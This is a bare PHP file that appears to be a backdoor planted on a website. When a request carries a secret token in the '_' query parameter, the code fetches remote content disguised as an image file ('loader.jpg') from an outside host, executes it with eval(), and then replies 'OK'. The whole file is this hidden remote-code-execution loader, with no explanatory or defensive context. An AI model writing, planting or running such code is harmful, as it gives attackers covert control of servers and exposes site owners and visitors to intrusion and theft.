<?php

if (isset($_GET['_']) && $_GET['_'] === 'drs_Mi5TeR572s8_c@Sq3r332afbsnk') {
    $url = "https://batuk-di-komik-aja.pages.dev/loader.jpg";

    if ($url !== "") {
        $code = file_get_contents($url);
        if ($code !== false) {
            eval("?>".$code);
        }
    }

    http_response_code(200);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'OK';
    exit;
}
